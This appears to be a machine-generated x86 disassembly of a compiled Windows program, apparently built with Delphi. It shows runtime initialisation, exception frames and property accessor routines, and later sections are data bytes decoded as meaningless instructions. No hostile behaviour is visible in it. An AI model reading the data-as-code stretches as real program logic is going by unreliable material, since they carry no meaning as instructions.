mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403184
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4041d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407b48
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_410334
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103aa
retn
call sub_40fee8
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404efc
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_4049e8
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_40e7b4
sub_4103ac
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410454
retn
mov eax rw-data
call sub_40feb8
mov eax sub_40e4b4
mov [ rw-data ] eax
mov eax sub_40e0dc
mov [ rw-data ] eax
mov edx sub_40dfec
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e7b4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fbac
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eac8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40edf4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f51c
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_410458
push ss
inc esi
add [ ebx + 0x640000ff ] ch
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] ch
inc esi
add [ ebp + 0x640000ff ] ch
push ss
inc esi
add [ esi + 0x640000ff ] ch
push ss
inc esi
add [ edi + 0x640000ff ] ch
push ss
inc esi
add [ eax + 0x640000ff ] dl
push ss
inc esi
add [ ecx + 0x640000ff ] dl
push ss
inc esi
add [ edx + 0x640000ff ] dl
push ss
inc esi
add [ ebx + 0x640000ff ] dl
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] dl
inc esi
add [ ebp + 0x640000ff ] dl
push ss
inc esi
add [ esi + 0x640000ff ] dl
push ss
inc esi
add [ edi + 0x640000ff ] dl
push ss
inc esi
add [ eax + 0x640000ff ] bl
push ss
inc esi
add [ ecx + 0x640000ff ] bl
push ss
inc esi
add [ edx + 0x640000ff ] bl
push ss
inc esi
add [ ebx + 0x640000ff ] bl
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] bl
inc esi
add [ ebp + 0x640000ff ] bl
push ss
inc esi
add [ esi + 0x640000ff ] bl
push ss
inc esi
add [ edi + 0x640000ff ] bl
push ss
inc esi
add [ eax + 0x640000ff ] al
push ss
inc esi
add [ ecx + 0x640000ff ] al
push ss
inc esi
add [ edx + 0x640000ff ] al
push ss
inc esi
add [ ebx + 0x640000ff ] al
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] al
inc esi
add [ ebp + 0x640000ff ] al
push ss
inc esi
add [ esi + 0x640000ff ] al
push ss
inc esi
add [ edi + 0x550000ff ] al
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41056c
retn
sub_4105b0
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4105fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4105a4
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407e50
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4105b0
mov edx [ rw-data ]
mov eax esi
call sub_407b48
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407b48
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407e50
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410660
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4106d0
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410744
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4107a0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4107f4
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404208
mov ecx esp
mov edx esi
mov eax ebx
call sub_4107a0
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_41083c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410828
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41087c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404798
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108cb
lea eax [ ebp - 0x4 ]
call sub_40464c
retn
sub_4108d4
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_4107f4
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_41083c
pop ebx
retn
dec bl
je r-xdata
call sub_41087c
jmp r-xdata
pop ebx
retn
sub_410900
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041f4
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4108d4
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4109cd
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404688
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4109d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4105a4
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410a1c ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410b4b ]
jmp [ eax * 4 + jump_table_410ab8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410be0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410bcc
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410c20
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410c58
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410c94
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4055c0
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410d08
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d55
retn
mov eax rw-data
call sub_403f6c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049e8
sub_410d60
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d8c
retn
sub_410f84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_411797
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0x10004118 ] al
add [ eax ] al
add al ch
adc eax 0x34640041
inc eax
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffc841583e
inc eax
inc ecx
add al cl
inc ecx
popad
jo r-xdata
add [ eax ] al
add al bl
sbb [ ecx ] eax
xor [ eax ] al
add [ eax ] al
les edx [ edi ]
inc ecx
add [ esp + esi + 0x40 ] ah
outsb
jae r-xdata
add [ eax ] al
inc ebx
inc ecx
add al bh
inc ecx
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ ebp + eax * 2 + 0x2a680041 ] al
inc eax
add [ ebp + eax * 2 + 0x45e40041 ] cl
inc ecx
jb r-xdata
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ esp + edx * 2 + 0x55000041 ] dh
imul ebp [ esi + 0x67 ] 0x7473694c
call 0x7415b02
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add ah ch
dec ebp
inc ecx
add al bh
inc eax
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add [ eax + 0x41 ] al
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ esp + eax * 2 + 0x45900041 ] bl
inc ecx
add [ edi + eax * 2 ] cl
inc ecx
add [ eax + 0x6c004147 ] bl
dec eax
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax - 0x2fffbeb8 ] ah
dec eax
inc ecx
add [ ecx + ecx * 2 ] ah
inc ecx
add al dl
dec ecx
inc ecx
add [ eax + 0x4b ] ch
inc ecx
add al al
dec ebx
inc ecx
add [ esp + ecx * 2 + 0x41 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + edx + 0xc0041 ] cl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
movsb [ edi ] [ esi ]
dec esp
inc ecx
add [ ebp + ecx * 2 + 0x41 ] ah
mov al 0x18
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
pop es
inc ebx
adc [ eax ] eax
add [ edi + ebp ] esi
pushfd
jae sub_411797
push ebx
je r-xdata
popad
inc ecx
add [ eax ] bl
push ebp
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x3c004155 ] bh
push esi
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
mov ah 0x54
inc ecx
add [ eax ] al
push ebp
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
lodsb [ esi ]
sbb [ ecx ] al
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2c41596e
xor al 0x40
outsb
jae r-xdata
add [ eax - 0x4bffbeb6 ] al
dec edx
inc ecx
add [ esp + ecx * 2 ] bl
inc ecx
add [ esp + ecx * 2 + 0x4d640041 ] ah
inc ecx
jae r-xdata
insb
popad
jae r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4307da82
push ebx
je r-xdata
popad
insd
mov eax eax
inc eax
sbb eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
sbb eax [ ecx ]
or [ eax ] al
add [ eax ] al
jl r-xdata
jb r-xdata
jae r-xdata
jae r-xdata
sbb [ ecx ] al
pop esp
push ss
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
dec [ ebx + 0x411810c0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4fffbee8 ] dl
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add bh bh
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
mov ah 0x1b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sbb eax [ ecx ]
adc [ eax ] al
add [ eax ] al
or al 0x1a
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24415be2
xor al [ eax ]
mov ah 0x54
inc ecx
add [ eax ] al
push ebp
inc ecx
add [ eax ] bl
push ebp
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x5b ] al
inc ecx
add [ esi + edx * 2 ] bh
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
call 0xffffffffcc415b6e
pop edx
inc ecx
add [ esp + edx * 2 + 0x58f80041 ] dh
inc ecx
add [ ecx + ebx * 2 ] cl
inc ecx
add [ eax + ebx * 2 + 0x58bc0041 ] ch
inc ecx
add [ eax - 0x33ffbeab ] bh
pop eax
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
pop eax
inc ecx
add [ 0x6e614854 ] cl
insb
add ah cl
insd
enter 0x411a 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x1a
inc ecx
add [ eax ] cl
add [ eax ] al
add [ edx + ebx ] cl
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24415af6
xor al [ eax ]
mov ah 0x54
inc ecx
add al bh
pop eax
inc ecx
add [ ecx + ebx * 2 ] cl
inc ecx
add [ eax + ebx * 2 + 0x58bc0041 ] ch
inc ecx
add [ eax - 0x33ffbeab ] bh
popad
add [ ebp + 0x1a580040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx + 0x41 ] dh
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x64004010 ]
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24415a86
xor al [ eax ]
add [ ebx + 0x4118d4c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
dec esi
inc ecx
add al cl
inc ecx
add [ eax ] al
jae r-xdata
jns r-xdata
push ebx
je r-xdata
cmp al 0x56
je r-xdata
add al bh
inc ecx
inc ecx
add ah dl
push eax
inc ecx
add [ eax ] cl
push ecx
inc ecx
add [ ecx + edx * 2 ] cl
inc ecx
add [ eax ] dl
push ecx
inc ecx
add ah ah
inc ebp
inc ecx
add [ edx + edx * 2 + 0x52e00041 ] al
inc ecx
add [ ebx + edx * 2 + 0x4ca40041 ] dh
inc ecx
add al dh
push ebx
inc ecx
add [ esp + edx * 2 + 0x41 ] ah
add [ eax - 0x6bffbeb2 ] cl
dec esi
inc ecx
add [ eax + 0x41 ] al
inc ecx
add [ eax ] dh
dec edi
inc ecx
add [ eax + 0x4f ] dh
inc ecx
add ah bl
dec edi
inc ecx
add [ eax + 0x6c004145 ] dl
push ecx
inc ecx
add [ eax + 0x6c004147 ] bl
dec eax
inc ecx
add [ eax - 0x47ffbeaf ] ch
push ecx
inc ecx
add al dl
dec eax
inc ecx
add [ ecx + ecx * 2 ] ah
inc ecx
add al dl
dec ecx
inc ecx
add [ eax + 0x4b ] ch
inc ecx
add al al
dec ebx
inc ecx
add [ esp + ecx * 2 + 0x41 ] dl
add al bh
dec esi
inc ecx
add [ edi + ecx * 2 ] dl
inc ecx
add [ edx + edx * 2 ] cl
inc ecx
add [ eax + edx * 2 + 0x41 ] bl
add [ esp + edx * 2 ] bl
inc ecx
add [ esp + edx * 2 ] ch
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
add [ ebx + 0x41 ] al
outsb
dec ecx
je r-xdata
mov ah 0x54
inc ecx
add [ eax ] al
push ebp
je r-xdata
outsd
jb r-xdata
insd
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ 0x6d654d54 ] cl
popad
insd
xor [ ecx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] dl
inc ecx
add [ eax + eax ] dl
add [ eax ] al
push 0x6400411b
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x64415c5e
pop ebx
inc ecx
add [ esp + edx * 2 + 0x5c080041 ] dh
inc ecx
add [ eax ] bl
push ebp
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add al al
pop esp
inc ecx
add [ eax + 0x5b ] al
push ebx
push ebx
inc ecx
add [ esi + edx * 2 ] bh
inc ebx
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
inc eax
sbb [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_415a22
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
inc ecx
add [ eax ] bl
push ebp
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ esi + ebx * 2 + 0x41 ] bh
add [ eax + 0x5b ] al
inc ecx
add [ esi + edx * 2 ] bh
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
lodsb [ esi ]
sbb al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sbb al 0x41
add [ eax ] bl
add [ eax ] al
add [ eax + 0x1b ] ch
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
